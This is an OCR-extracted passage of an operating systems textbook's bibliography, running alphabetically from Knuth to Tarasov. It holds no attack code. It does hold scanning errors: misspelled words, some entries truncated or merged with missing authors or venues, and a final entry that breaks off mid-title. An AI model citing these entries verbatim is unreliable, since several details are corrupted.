KNUTH,D.E.:The Art of Computer Programming,Vol.Boston:Addison-Wesley,1997.
KOLLER,R.,MARMOL,L.,RANGASWAMI,R,SUNDARARAMAN,S.,TALAGALA,N.,
and ZHAO,M.:"Write Policies for Host-side Flash Caches,"Proc.11th USENIX
Conf.on File and Storage Tech., USENIX,pp.45-58,2013.
KOUFATY,D.,REDDY,D.,and HAHN,S.:"Bias Scheduling in Heterogeneous Multi-Core Architectures,"Proc.Fifth European Conf.on Computer Systems(EUROSYS),ACM, pp.125-138,2010.
KRATZER,C,DITTMANN,J.,LANG,A.,and KUHNE,T.:“WLAN Steganography:A First Practical Review,"Proc.Eighth Workshop on Multimedia and Security,ACM, pp.17-22,2006.
KRAVETS,R.,and KRISHNAN,P.: “Power Management Techniques for Mobile Communi- cation,"Proc.Fourth ACM/IEEE Int'l Conf.on Mobile Computing and Networking, ACM/IEEE,pp.157-168,1998.
KRISH,K.R.,WANG,G.,BHATTACHARJEE,P.,BUTT,A.R.,and SNIADY,C.:“On Reduc-
ing Energy Management Delays in Disks,"J.Parallel and Distributed Computing,vol.
73,pp.823-835,June 2013.
KRUEGER,P.,LAI,T.-H.,and DIXIT-RADIYA,V.A:"Job Scheduling Is More Important Than Processor Allocation for Hypercube Computers,"IEEE Trans.on Parallel and Distr:Systems,vol.5,pp.488-497,May 1994.
KUMAR,R.,TULLSEN,D.M.,JOUPPI,N.P.,and RANGANATHAN,P.: “Heterogeneous Chip Multiprocessors,"Computer,vol.38,pp.32-38,Nov.2005.
KUMAR,V.P.,and REDDY,S.M.:"Augmented Shuffle-Exchange Multistage Interconnec- tion Networks,"Computer,vol.20,pp.30-40,June 1987.
KWOK,Y.-K.,AHMAD,I: "Static Scheduling Algorithms for Allocating Directed Task
Graphs to Multiprocessors,"Computing Surveys,vol.31,pp.406-471,Dec.1999.
LACHAIZE,R.,LEPERS,B.,and QUEMA,V.:"MemProf:A Memory Profiler for NUMA Multicore Systems,"Proc.USENIX Ann.Tech.Conf,USENIX,2012.
LAI,W.K.,and TANG, C.-L:“QoS-aware Downlink Packet Scheduling for LTE Net- works,"Computer Networks,vol.57,pp.1689-1698,May 2013.
LAMPSON,B.W.:“A Note on the Confinement Problem,”Commun.of the ACM,vol.10, pp.613-615,Oct.1973.
LAMPORT,L.:"Password Authentication with Insecure Communication,"Commun.of the ACM,vol.24,pp.770-772,Nov.1981.
LAMPSON,B.W.:"Hints for Computer System Design,"IEEE Sofiware,vol.1,pp.11-28,
Jan.1984.
LAMPSON,B.W.,and STURGIS,H.E.:“Crash Recovery in a Distributed Data Storage Sys- tem,"Xerox Palo Alto Research Center Technical Report,June 1979.
LANDWEHR,C.E.:"Formal Models of Computer Security,"Computing Surveys,vol.13, pp.247-278,Sept.1981.
LANKES,S.,REBLE,P.,SINNEN,O.,and CLAUSS, C.:“Revisiting Shared Virtual Memory
Systems for Non-Coherent Memory-Coupled Cores,"Proc.2012 Int'Workshop on
Programming Models for Applications for Multicores and Manycores,ACM,pp.
45-54,2012.
LEE,Y.,JUNG,T.,and SHIN,IL "Demand-Based Flash Translation Layer Considering Spatial Locality,”Proc.28th Annual Symp.on Applied Computing,ACM,pp. 1550-1551,2013.
LEVENTHAL,A.D.:“A File System All Its Own,”Commun.of the ACM,vol.56,pp.
64-67,May 2013.
LEVIN,R.,COHEN,E.S.,CORWIN,W.M.,POLLACK,F.J.,and WULF,W.A.: "Pol- icy/Mechanism Separation in Hydra,"Proc.Fifith Symp.on Operating Systems Princi- ples,ACM,pp.132-140,1975.
LEVINE,G.N.:“Defining Deadlock,”ACM SIGOPS Operating Systems Rev,vol.37,pp.
54-64,Jan.2003.
LEVINE,J.G.,GRIZZARD,J.B.,and OWEN,H.L.:"Detecting and Categorizing Kernel- Level Rootkits to Aid Future Detection,"IEEE Security and Privacy,vol.4,pp. 24-32,Jan./Feb.2006.
LI,D,JIN,H.,LIAO,X.,ZHANG,Y.,and ZHOU,B.:"Improving Disk I/O Performance in a
Virtualized System,"J.Computer and Syst.Sci,vol.79,pp.187-200,March 2013a.
LI,D.,LIAO,X,JIN,H.,ZHOU,B.,and ZHANG,Q:“A New Disk I/O Model of Virtual- ized Cloud Environment,"IEEE Trans.on Parallel and Distributed Systems,vol.24, pp.1129-1138,June 2013b.
LI,K.: Shared Virtual Memory on Loosely Coupled Multiprocessors,Ph.D.Thesis,Yale Univ.,1986.
LI,K.,and HUDAK,P.:"Memory Coherence in Shared Virtual Memory Systems,"ACM Trans.on Computer Systems,vol.7,pp.321-359,Nov.1989.
LI,K.,KUMPF,R.,HORTON,P.,and ANDERSON,T.:“A Quantitative Analysis of Disk Drive Power Management in Portable Computers,"Proc.USENIX Winter Conf., USENIX,pp.279-291,1994.
LI,Y.,SHOTRE,S.,OHARA,Y.,KROEGER,T.M.,MILLER,E.L.,and LONG,D.D.E :
“Horus:Fine-Grained Encryption-Based Security for Large-Scale Storage,”Proc.11th
USENIX Conf.on File and Storage Tech., USENIX,pp.147-160,2013c.
LIEDTKE,J.:"Improving IPC by Kernel Design,"Proc.14th Symp.on Operating Systems Principles,ACM,pp.175-188,1993.
LIEDTKE,J.:"On Micro-Kernel Construction,"Proc.15th Symp.on Operating Systems Principles,ACM,pp.237-250,1995.
LIEDTKE, J.:"Toward Real Microkernels,"Commun.of the ACM,vol.39,pp.70-77, Sept.1996.
LING,X.,JIN,H.,IBRAHIM,S.,CAO,W.,and WU,S.:“Efficient Disk I/O Scheduling with QoS Guarantee for Xen-based Hosting Platforms,"Proc.12th Int'l Symp.on Cluster; Cloud,and Grid Computing,IEEE/ACM,pp.81-89,2012.
LIONS,J.:Lions'Commentary on Unix 6th Edition,with Source Code,San Jose,CA:Peer- to-Peer Communications,1996.
LIU,T,CURTSINGER,C.,and BERGER,E.D.:"Dthreads:Efficient Deterministic Multi-
2011.
LIU,Y.,MUPPALA,J.K,VEERARAGHAVAN,M.,LIN,D.,and HAMDI,M.:Data Center
Networks:Topologies,Architectures and Fault-Tolerance Characteristics,Springer,
2013.
LO,V.M.: "Heuristic Algorithms for Task Assignment in Distributed Systems,"Proc.
Fourth Int'I Conf.on Distributed Computing Systems,IEEE,pp.30-39,1984.
LORCH,J.R.,PARNO,B.,MICKENS,J.,RAYKOVA,M.,and SCHIFFMAN,J.:"Shroud: Ensuring Private Access to Large-Scale Data in the Data Center,"Proc.11th USENIX Conf.on File and Storage Tech., USENIX,pp.199-213,2013.
LOPEZ-ORTIZ,A.,SALINGER,A.: "Paging for Multi-Core Shared Caches,"Proc.Inno- vations in Theoretical Computer Science,ACM,pp.113-127,2012.
LORCH,J.R.,and SMITH,AJ.:“Apple Macintosh's Energy Consumption,”IEEE Micro,
vol.18,pp.54-63,Nov./Dec.1998.
LOVE,R.: Linux System Programming:Talking Directly to the Kernel and C Library, Sebastopol,CA:O'Reilly &Associates,2013.
LUDWIG,M.A.: The Little Black Book ofEmail Viruses,Show Low,AZ:American Eagle Publications,2002.
LUO,T.,MA,S.,LEE,R.,ZHANG,X.,LIU,D.,and ZHOU,L:"S-CAVE:Effective SSD Caching to Improve Virtual Machine Storage Performance,"Proc.22nd Int'l Conf.on Parallel Arch.and Compilation Tech.,IEEE,pp.103-112,2013.
Fast File System Checker,”Proc.11th USENIX Conf.on File and Storage Tech., USENIX,2013.
MAO,W.: “The Role and Effectiveness of Cryptography in Network Virtualization:A Posi- tion Paper,"Proc.Eighth ACM Asian SIGACT Symp.on Information,Computer;and Commun.Security,ACM,pp.179-182,2013.
MARINO,D.,HAMMER,C.,DOLBY,J.,VAZIRI,M.,TIP,F.,and VITEK,J.:"Detecting
Deadlock in Programs with Data-Centric Synchronization,"Proc.Int'!
Conf.on Sofi- ware Engineering,IEEE,pp.322-331,2013.
MARSH,B.D,SCOTT,M.L.,LEBLANC,T.J.,and MARKATOS,E.P.: “First-Class User-
Level Threads,”Proc.13th Symp.on Operating Systems Principles,ACM,pp. 110-121,1991.
MASHTIZADEH,A.J,BITTAY,A,HUANG,Y.F,and MAZIERES,D:"Replication,His-
tory,and Grafting in the Ori File System,"Proc.24th Symp.on Operating System Principles,ACM,pp.151-166,2013.
MATTHUR,A.,and MUNDUR,P.:"Dynamic Load Balancing Across Mirrored Multimedia Servers,"Proc.2003 Int'l Conf.on Multimedia,IEEE,pp.53-56,2003.
MAXWELL,S .:Linux Core Kernel Commentary,Scottsdale,AZ:Coriolis Group Books, 2001.
MAZUREK,M.L.,THERESKA,E.,GUNAWARDENA,D.,HARPER,R.,and SCOTT,J.: “ZZFS:A Hybrid Device and Cloud File System for Spontaneous Users,”Proc.10th USENIX Conf.on File and Storage Tech., USENIX,pp.195-208,2012.
McKUSICK,M.K.,BOSTIC,K.,KARELS,M.J,QUARTERMAN,J.S.:T he Design and
Implementation of the 4.4BSD Operating System,Boston:Addison-Wesley,1996.
McKUSICK,M.K,and NEVILLE-NEIL,G.V.: The Design and Implementation of the
FreeBSD Operating System,Boston:Addison-Wesley,2004.
McKUSICK,M.K.: "Disks from the Perspective of a File System,"Commun.of the ACM, vol.55,pp.53-55,Nov.2012.
MEAD,N.R.: “Who Is Liable for Insecure Systems?
”Computer,vol.37,pp.27-34,July 2004.
MELLOR-CRUMMEY,J.M.,and SCOTT,M.L.:“Algorithms for Scalable Synchronization on Shared-Memory Multiprocessors,"ACM Trans.on Computer Systems,vol.9,pp. 21-65,Feb.1991.
MIKHAYLOV,K.,and TERVONEN,J.:"Energy Consumption of the Mobile Wireless Sen- sor Network's Node with Controlled Mobility,"Proc.27th Int'Conf.on Advanced Networking and Applications Workshops,IEEE,pp.1582-1587,2013.
MILOJICIC,D.: "Security and Privacy,"IEEE Concurrency,vol.8,pp.70-79,April-June
2000.
MOODY,G.:Rebel Code,Cambridge.MA:Perseus Publishing,2001.
MOON,S.,and REDDY,A.L.N.:"Don't Let RAID Raid the Lifetime of Your SSD Array,"
Proc.Fifth USENIX Workshop on Hot Topics in Storage and File Systems,USENIX,
2013.
MORRIS,R.,and THOMPSON,K.: "Password Security:A Case History,"Commun.of the ACM,vol.22,pp.594-597,Nov.1979.
MORUZ,G.,and NEGOESCU,A.:“Outperforming LRU Via Competitive Analysis on Parametrized Inputs for Paging,”Proc.23rd ACM-SLAM Symp.on Discrete Algo- rithms,SIAM,pp.1669-1680.
MOSHCHUK,A.,BRAGIN,T,GRIBBLE,S.D.,and LEVY,H.M:“A Crawler-Based Study of Spyware on the Web,"Proc.Network and Distributed System Security Symp.,Inter- net Society,pp.1-17,2006.
MULLENDER,S.J.,and TANENBAUM,A.S.:"Immediate Files,"Software Practice and Experience,vol.14,pp.365-368,1984.
NACHENBERG,C.:“Computer Virus-Antivirus Coevolution,”Commun.of the ACM,vol.
40,pp.46-51,Jan.1997.
NARAYANAN,D.,N.THERESKA,E.,DONNELLY,A.,ELNIKETY,S.and ROWSTRON,A : “Migrating Server Storage to SSDs:Analysis of Tradeoffs,”Proc.Fourth European Conf.on Computer Systems (EUROSYS),ACM,2009.
NELSON,M.,LIM,B.-H.,and HUTCHINS, G:"Fast Transparent Migration for Virtual Machines,"Proc.USENZX Ann.Tech.Conf,USENIX,pp.391-394,2005.
NEMETH,E.,SNYDER,G.,HEIN,T.R.,and WHALEY,B.: UNIX and Linux System Admin- istration Handbook,4th ed.,Upper Saddle River,NJ:Prentice Hall,2013.
NEWTON,G.:"Deadlock Prevention,Detection,and Resolution:An Annotated Bibliogra- phy,"ACM SIGOPS Operating Systems Rev,vol.13,pp.33-44,April 1979.
NIEH,J.,and LAM,M.S.:“A SMART Scheduler for Multimedia Applications,”ACM
Trans.on Computer Systems,vol.21,pp.117-163,May 2003.
NIGHTINGALE,E.B.,ELSON,J.,FAN,J.,HOGMANN,O.,HOWELL,J.,and SUZUE,Y.:
"Flat Datacenter Storage,"Proc.10th Symp.on Operating Systems Design and Imple-
mentation,USENIX,pp.1-15,2012.
NIJIM,M.,QIN,X.,QIU,M.,and LI,K.:“An Adaptive Energy-conserving Strategy for Par-
allel Disk Systems,"Future Generation Computer Systems,vol.29,pp.196-207,Jan.
2013.
NIST(National Institute of Standards and Technology):FIPS Pub.180-1,1995.
NIST(National Institute of Standards and Technology):“The NIST Definition of Cloud Computing,"Special Publication 800-145,Recommendations of the National Institute of Standards and Technology,2011.
NO,J.: "NAND Flash Memory-Based Hybrid File System for High I/O Performance,"J.
Parallel and Distributed Computing,vol.72,pp.1680-1695,Dec.2012.
OH,Y.,CHOI,J.,LEE,D.,and NOH,S.H.:“Caching Less for Better Performance:Balanc- ing Cache Size and Update Cost of Flash Memory Cache in Hybrid Storage Systems," Proc.10th USENIX Conf.on File and Storage Tech., USENIX,pp.313-326,2012.
OHNISHI,Y.,and YOSHIDA,T.:“Design and Evaluation of a Distributed Shared Memory
Network for Application-Specific PC Cluster Systems,"Proc.Workshops of Int'Conf.
on Advanced Information Networking and Applications,IEEE,pp.63-70,2011.
OKI,B.,PFLUEGL,M.,SIEGEL,A.,and SKEEN,D.:“The Information Bus—An Architec- ture for Extensible Distributed Systems,”Proc.14th Symp.on Operating Systems Principles,ACM,pp.58-68,1993.
ONGARO,D.,RUMBLE,S.M.,STUTSMAN,R.,OUSTERHOUT,J.,and ROSENBLUM,M.: "Fast Crash Recovery in RAMCloud,"Proc.23rd Symp.of Operating Systems Princi- ples,ACM,pp.29-41,2011.
ORGANICK,E.I.:The Multics System,Cambridge,MA:M.IT.Press,1972.
ORTOLANI,S.,and CRISPO,B.:"NoisyKey:Tolerating Keyloggers via Keystrokes Hid-
ing,"Proc.Seventh USENLX Workshop on Hot Topics in Security,USENIX,2012.
ORWICK,P.,and SMITH,G.: Developing Drivers with the Windows Driver Foundation, Redmond,WA:Microsoft Press,2007.
OSTRAND,T.J.,and WEYUKER,E.J.:“The Distribution of Faults in a Large Industrial Software System,"Proc.2002 ACM SIGSOFT Int'Symp.on Software Testing and Analysis,ACM,pp.55-64,2002.
OSTROWICK,J.:Locking Down Linux—An Introduction to Linux Security,Raleigh,NC:
Lulu Press,2013.
OUSTERHOUT,J.K.:“Scheduling Techniques for Concurrent Systems,"Proc.Third Int'I Conf.on Distrib.Computing Systems,IEEE,pp.22-30,1982.
OUSTERHOUT,J.L.:"Why Threads are a Bad Idea(for Most Purposes),"Presentation at Proc. USENIX Winter Conf., USENIX,1996.
PARK,S.,and SHEN,K.:"FIOS:A Fair,Efficient Flash I/O Scheduler,"Proc.10th USENIX Conf.on File and Storage Tech., USENIX,pp.155-170,2012.
PATHAK,A.,HU,Y.C.,and ZHANG,M:"Where Is the Energy Spent inside My App?
Fine Grained Energy Accounting on Smartphones with Eprof,"Proc.Seventh European Conf.on Computer Systems (EUROSYS),ACM,2012.
PATTERSON,D.,and HENNESSY,J.:Computer Organization and Design,5th ed.,Burling- ton,MA:Morgan Kaufman,2013.
PATTERSON,D.A.,GIBSON,G.,and KATZ,R.:“A Case for Redundant Arrays of Inexpen- sive Disks(RAID),”Proc.ACM SIGMOD Int'.Conf.on Management of Data,ACM, pp.109-166,1988.
PEARCE,M.,ZEADALLY,S.,and HUNT,R.:“Virtualization:Issues,Security Threats,and Solutions,"Computing Surveys,ACM,vol.45,Art.17,Feb.2013.
PENNEMAN,N.,KUDINSKLAS,D,RAWSTHORNE,A.,DE SUTTER,B.,and DE BOSS- CHERE,K.: "Formal Virtualization Requirements for the ARM Architecture,"J.Sys- tem Architecture:the EUROMICROJ,vol.59,pp.144-154,March 2013.
PESERICO,E.:“Online Paging with Arbitrary Associativity,”Proc.14th ACM-SLAM Symp.on Discrete Algorithms,ACM,pp.555-564,2003.
PETERSON,G.L.:"Myths about the Mutual Exclusion Problem,"Information Processing Letters,vol.12,pp.115-116,June 1981.
PETRUCCI,V.,and LOQUES,O.:“Lucky Scheduling for Energy-Efficient Heterogeneous Multi-core Systems,"Proc.USENIX Workshop on Power-Aware Computing and Sys- tems,USENIX,2012.
PETZOLD,C.:Programming Windows,6th ed.,Redmond,WA:Microsoft Press,2013.
PIKE,R.,PRESOTTO,D.,THOMPSON,K.,TRICKEY,H.,and WINTERBOTTOM,P.: "The Use of Name Spaces in Plan 9,"Proc.5th ACM SIGOPS European Workshop, ACM,pp.1-5,1992.
POPEK,GJ.,and GOLDBERG,R.P.:"Formal Requirements for Virtualizable Third Gener-
ation Architectures,"Commun.of the ACM,vol.17,pp.412-421,July 1974.
PRABHAKAR,R.,KANDEMIR,M.,and JUNG,M: "Disk-Cache and Parallelism Aware I/O Scheduling to Improve Storage System Performance,"Proc.27th Int'Symp.on Parallel and Distributed Computing,IEEE,pp.357-368,2013.
PRECHELT,L.:“An Empirical Comparison of Seven Programming Languages,”Com- puter,vol.33,pp.23-29,Oct.2000.
PYLA,H.,and VARADARAJAN,S.:"Transparent Runtime Deadlock Elimination,"Proc.
21st Int'l Conf.on Parallel Architectures and Compilation Techniques,ACM,pp. 477-478,2012.
QUIGLEY,E .:UNIX Shells by Example,4th ed.,Upper Saddle River,NJ:Prentice Hall, 2004.
RAJGARHIA,A.,and GEHANI,A.:"Performance and Extension of User Space File Sys-
tems,"Proc.2010 ACM Symp.on Applied Computing,ACM,pp.206-213,2010.
RASANEH,S.,and BANIROSTAM,T:“A New Structure and Routing Algorithm for Opti- mizing Energy Consumption in Wireless Sensor Network for Disaster Management," Proc.Fourth Int'Conf.on Intelligent Systems,Modelling,and Simulation,IEEE,pp. 481-485.
RAVINDRANATH,L.,PADHYE,J.,AGARWAL,S.,MAHAJAN,R.,OBERMILLER,I.,and
SHAYANDEH,S.:“Applnsight:Mobile App Performance Monitoring in the Wild,” Proc.10th Symp.on Operating Systems Design and Implementation,USENIX,pp. 107-120,2012.
RECTOR,B.E,and NEWCOMER,J.M.: Win32 Programming,Boston:Addison-Wesley,
1997.
REEVES,R.D.: Windows 7 Device Driver,Boston:Addison-Wesley,2010.
RENZELMANN,M.J.,KADAV,A.,and SWIFT,M.M:“SymDrive:Testing Drivers without Devices,"Proc.10th Symp.on Operating Systems Design and Implementation, USENIX,pp.279-292,2012.
RIEBACK,M.R.,CRISPO,B.,and TANENBAUM,A.S.:“Is Your Cat Infected with a Com- puter Virus?
,”Proc.Fourth IEEE Int'T Conf.on Pervasive Computing and Commun., IEEE,pp.169-179,2006.
RITCHIE,D.M.,and THOMPSON,K.:“The UNIX Timesharing System,”"Commun.of the ACM,vol.17,pp.365-375,July 1974.
RIVEST,R.L.,SHAMIR,A.,and ADLEMAN,L.:“On a Method for Obtaining Digital Sig-
natures and Public Key Cryptosystems,"Commun.of the ACM,vol.21,pp.120-126, Feb.1978.
RIZZO,L.:"Netmap:A Novel Framework for Fast Packet I/O,"Proc.USENIX Ann.Tech.
Conf,USENIX,2012.
ROBBINS,A: UNIX in a Nutshell,Sebastopol,CA:O'Reilly &Associates,2005.
RODRIGUES,E.R.,NAVAUX,P.O.,PANETTA,J.,and MENDES,C.L.:“A New Technique for Data Privatization in User-Level Threads and Its Use in Parallel Applications,” Proc.2010 Symp.on Applied Computing,ACM,pp.2149-2154,2010.
RODRIGUEZ-LUJAN,L,BAILADOR, G.,SANCHEZ-AVILA,C.,HERRERO,A.,and
VIDAL-DE-MIGUEL,G. :"Analysis of Pattern Recognition and Dimensionality Reduc- tion Techniques for Odor Biometrics,"vol.52,pp.279-289,Nov.2013.
ROSCOE,T.,ELPHINSTONE,K.,and HEISER,G.:"Hype and Virtue,"Proc.11th Work- shop on Hot Topics in Operating Systems,USENIX,pp.19-24,2007.
ROSENBLUM,M.,BUGNION,E.,DEVINE,S.and HERROD,S.A.:“Using the SIMOS
Machine Simulator to Study Complex Computer Systems,"ACM Trans.Model.Com- put.Simul.,vol.7,pp.78-103,1997.
ROSENBLUM,M.,and GARFINKEL,T.:“Virtual Machine Monitors:Current Technology and Future Trends,"Computer,vol.38,pp.39-47,May 2005.
ROSENBLUM,M.,and OUSTERHOUT,J.K.:"The Design and Implementation of a Log- Structured File System,"Proc.13th Symp.on Operating Systems Principles,ACM,pp. 1-15,1991.
ROSSBACH,C.J.,CURREY,J.,SILBERSTEIN,M.,RAY,and B.,WITCHEL,E.:“PTask: Operating System Abstractions to Manage GPUs as Compute Devices,"Proc.23rd Symp.of Operating Systems Principles,ACM,pp.233-248,2011.
ROSSow,C,ANDRIESSE,D.,WERNER,T,STONE-GROSS,B.,PLOHMANN,D.,DIET-
RICH,C.J.,and BOS,H.:"SoK:P2PWNED—Modeling and Evaluating the Resilience of Peer-to-Peer Botnets,"Proc.IEEE Symp.on Security and Privacy,IEEE,pp. 97-111,2013.
ROZIER,M.,ABROSSIMOV,V.,ARMAND,F.,BOULE,1.,GIEN,M.,GUILLEMONT,M.,
HERRMANN,F,KAISER,C.,LEONARD,P.,LANGLOIS,S.,and NEUHAUSER,W.: “Chorus Distributed Operating Systems,”Computing Systems,vol.1,pp.305-379, Oct.1988.
RUSSINOVICH,M.,and SOLOMON,D.: Windows Internals,Part 1,Redmond,WA:
Microsoft Press,2012.
RYZHYK,L.,CHUBB,P.,KUZ,L,LE SUEUR,E.,and HEISER,G.:“Automatic Device Driver Synthesis with Termite,"Proc.22nd Symp.on Operating Systems Principles, ACM,2009.
RYZHYK,L.,KEYS,J.MIRLA,B.,RAGNUNATH,A.,VIJ,M.,and HEISER,G.: "Improved Device Driver Reliability through Hardware Verification Reuse,"Proc. 16th Int'Conf.on Arch.Support for Prog.Lang.and Operating Systems,ACM,pp. 133-134,2011.
SACKMAN,H.,ERIKSON,W.J.,and GRANT,E.E.:“Exploratory Experimental Studies Comparing Online and Offline Programming Performance,"Commun.of the ACM, vol.11,pp.3-11,Jan.1968.
SAITO,Y.,KARAMANOLIS,C.,KARLSSON,M.,and MAHALINGAM,M.: "Taming Aggressive Replication in the Pangea Wide-Area File System,"Proc.Fifth Symp.on Operating Systems Design and Implementation,USENIX,pp.15-30,2002.
SALOMIE T.-L,SUBASU,I.E.,GICEVA,J.,and ALONSO,G.:"Database Engines on Multi- cores:Why Parallelize When You can Distribute?
,"Proc.Sixth European Conf.on Computer Systems (EUROSYS),ACM,pp.17-30,2011.
SALTZER,J.H.:"Protection and Control of Information Sharing in MULTICS,"Commun.
of the ACM,vol.17,pp.388-402,July 1974.
SALTZER,J.H.,and KAASHOEK,M.E:Principles of Computer System Design:An Intro- duction,Burlington,MA:Morgan Kaufmann,2009.
SALTZER,J.H,REED,D.P,and CLARK,D.D.: “End-to-End Arguments in System
Design,"ACM Trans.on Computer Systems,vol.2,pp.277-288,Nov.1984.
SALTZER,J.H.,and SCHROEDER,M.D.:“The Protection of Information in Computer Systems,"Proc.IEEE,vol.63,pp.1278-1308,Sept.1975.
SALUS,P.H.:"UNIX At 25,"Byte,vol.19,pp.75-82,Oct.1994.
SASSE,M.A.:"Red-Eye Blink,Bendy Shuffle,and the Yuck Factor:A User Experience of Biometric Airport Systems,"IEEE Security and Privacy,vol.5,pp.78-81,May/June 2007.
SCHEIBLE,J.P:"A Survey of Storage Options,"Computer,vol.35,pp.42-46,Dec.2002.
SCHINDLER,J.,SHETE,S.,and SMITH,K.A:"Improving Throughput for Small Disk Requests with Proximal I/O,”Proc.Ninth USENLX Conf.on File and Storage Tech., USENIX,pp.133-148,2011.
SCHWARTZ,C.,PRIES,R.,and TRAN-GIA,P.:“A Queuing Analysis of an Energy-Saving Mechanism in Data Centers,"Proc.2012 Int'T Conf.on Inf.Networking,IEEE,pp. 70-75,2012.
SCOTT,M.,LEBLANC,T.,and MARSH,B.:"Multi-Model Parallel Programming in Psy- che,"Proc.Second ACM Symp.on Principles and Practice of Parallel Programming, ACM,pp.70-78,1990.
SEAWRIGHT,L.H.,and MACKINNON,R.A.:"VM/370—A Study of Multiplicity and Use- fulness,"IBM Systems J.,vol.18,pp.4-17,1979.
SEREBRYANY,K.,BRUENING,D.,POTAPENKO,A.,and VYUKOV,D.:“AddressSanitizer:
A Fast Address Sanity Checker,”Proc.USENIX Ann.Tech.Conf.,USENIX,pp. 28-28,2013.
SEVERINI,M.,SQUARTINI,S.,and PIAZZA,E:“An Energy Aware Approach for Task Scheduling in Energy-Harvesting Sensor Nodes,"Proc.Ninth Int'l Conf.on Advances in Neural Networks,Springer-Verlag,pp.601-610,2012.
SHEN,K.,SHRIRAMAN,A.,DWARKADAS,S.,ZHANG,X.,and CHEN,Z.:“Power Con-
tainers:An OS Facility for Fine-Grained Power and Energy Management on Multicore
Servers,"Proc.18th Int'I Conf.on Arch.Support for Prog.Lang.and Operating Sys-
tems,ACM,pp.65-76,2013.
SIMON,R.J.:Windows NT Win32 API SuperBible,Corte Madera,CA:Sams Publishing, 1997.
606 第 1 3 章
SITARAM,D.,and DAN,A.:Multimedia Servers,Burlington,MA:Morgan Kaufiman,2000.
SLOWINSKA,A.,STANESCU,T., and BOS,H.:"Body Armor for Binaries:Preventing
Buffer Overflows Without Recompilation,"Proc.USENIX Ann.Tech.Conf,USENIX,
2012.
SMALDONE,S.,WALLACE,G.,and HSU,W.:"Efficiently Storing Virtual Machine Back-
ups,"Proc.Fifth USENIX Conf.on Hot Topics in Storage and File Systems,USENIX,
2013.
SMITH,D,K.,and ALEXANDER,R.C.: Fumbling the Future:How Xerox Invented,Then
Ignored,the First Personal Computer,New York:William Morrow,1988.
SNIR,M,OTTO,S.W.,HUSS-LEDERMAN,S.,WALKER,D.W.,and DONGARRA,J.:MPI:
The Complete Reference Manual,Cambridge,MA:M.I.T.Press,1996.
SNOW,K.,MONROSE,F.,DAVI,L.,DMITRIENKO,A.,LIEBCHEN,C,and SADEGHI, A.-R.: "Just-In-Time Code Reuse:On the Effectiveness of Fine-Grained Address Space Layout Randomization,"Proc.IEEE Symp.on Security and Privacy,IEEE,pp.
574-588,2013.
SOBELL,M.: A Practical Guide to Fedora and Red Hat Enterprise Linux,7th ed., Upper Saddle River,NJ:Prentice-Hall,2014.
SOORTY,B.: “Evaluating IPv6 in Peer-to-peer Gigabit Ethernet for UDP Using Modern
Operating Systems,”Proc.2012 Symp.on Computers and Commun.,IEEE,pp.
534-536,2012.
SPAFFORD,E.,HEAPHY,K.,and FERBRACHE,D.:Computer Viruses,Arlington,VA:
ADAPSO,1989.
STALLINGS,W.:Operating Systems,7th ed.,Upper Saddle River,NJ:Prentice Hall,2011.
STAN,M.R.,and SKADRON,K: "Power-Aware Computing,"Computer,vol.36,pp.
35-38,Dec.2003.
STEINMETZ,R.,and NAHRSTEDT,K.: Multimedia:Computing,Communications and Applications,Upper Saddle River,NJ:Prentice Hall,1995.
STEVENS,R.W,and RAGO,S.A.: “Advanced Programming in the UNIX Environment,”
Boston:Addison-Wesley,2013.
STOICA,R.,and AILAMAKI,A.:“Enabling Efficient OS Paging for Main-Memory OLTP Databases,"Proc.Ninth Int'7 Workshop on Data Management on New Hardware, ACM,Art.7.2013.
STONE,H.S,and BOKHARI,S.H.:“Control of Distributed Processes,”Computer,vol.11, pp.97-106,July 1978.
STORER,M.W.,GREENAN,K.M.,MILLER,E.L.,and VORUGANTI,K.:"POTSHARDS:
Secure Long-Term Storage without Encryption,"Proc.USENIX Ann.Tech.Conf,
USENIX,pp.143-156,2007.
STRATTON,J.A.,RODRIGUES,C,SUNG,I.-J.,CHANG,L.-W.,ANSSARI,N,LIU,G .,
HWU,W.-M.,and OBEID,N.:“Algorithm and Data Optimization Techniques for Scal-
ing to Massively Threaded Systems,"Computer,vol.45,pp.26-32,Aug.2012.
SUGERMAN,J.,VENKITACHALAM,G.,and LIM,B.-H:"Virtualizing I/O Devices on
VMware Workstation's Hosted Virtual Machine Monitor,"Proc.USENIX Ann.Tech.
Conf,USENIX,pp.1-14,2001.
SULTANA,S.,and BERTINO,E.:“A File Provenance System,”Proc.Third Conf.on Data and Appl.Security and Privacy,ACM,pp.153-156,2013.
SUN,Y.,CHEN,M.,LIU,B.,and MAO,S.:“FAR:A Fault-Avoidance Routing Method for Data Center Networks with Regular Topology,"Proc.Ninth ACM/IEEE Symp.for Arch.for Networking and Commun.Systems,ACM,pp.181-190,2013.
SWANSON,S.,and CAULFIELD,A.M.:“Refactor,Reduce,Recycle:Restructuring the I/O Stack for the Future of Storage,"Computer,vol.46,pp.52-59,Aug.2013.
TAIABUL HAQUE,S.M.,WRIGHT,M.,and SCIELZO,S.:"A Study of User Password Strategy for Multiple Accounts,"Proc.Third Conf.on Data and Appl.Security and Privacy,ACM,pp.173-176,2013.
TALLURI,M.,HILL,M.D,and KHALIDI,Y.A:“A New Page Table for 64-Bit Address
Spaces,"Proc.15th Symp.on Operating Systems Principles,ACM,pp.184-200,
1995.
TAM,D.,AZIMI,R.,and STUMM,M.: "Thread Clustering:Sharing-Aware Scheduling,"
Proc.Second European Conf.on Computer Systems (EUROSYS),ACM,pp.47-58, 2007.
TANENBAUM,A.S.,and AUSTIN,T.:Structured Computer Organization,6th ed.,Upper Saddle River,NJ:Prentice Hall,2012.
TANENBAUM,A.S.,HERDER,J.N.,and BOS,H.:"File Size Distribution on UNIX Sys-
tems:Then and Now,"ACM SIGOPS Operating Systems Rev,vol.40,pp.100-104, Jan.2006.
TANENBAUM,A.S.,VAN RENESSE,R.,VAN STAVEREN,H.,SHARP,G.J.,MULLENDER, S.J,JANSEN,J.,and VAN ROSSUM,G:“Experiences with the Amoeba Distributed Operating System,"Commun.of the ACM,vol.33,pp.46-63,Dec.1990.
TANENBAUM,A.S.,and VAN STEEN,M.R.: Distributed Systems,2nd ed.,Upper Saddle River,NJ:Prentice Hall,2007.
TANENBAUM, A.S., and WETHERALL,D.J: Computer Networks,5th ed.,Upper Saddle River,NJ:Prentice Hall,2010.
TANENBAUM,A.S.,and WOODHULL,A.S.:Operating Systems:Design and Implementa-
tion,3rd ed.,Upper Saddle River,NJ:Prentice Hall,2006.
TARASOV,V.,HILDEBRAND,D.,KUENNING,G.,and ZADOK, E.:“Virtual Machine
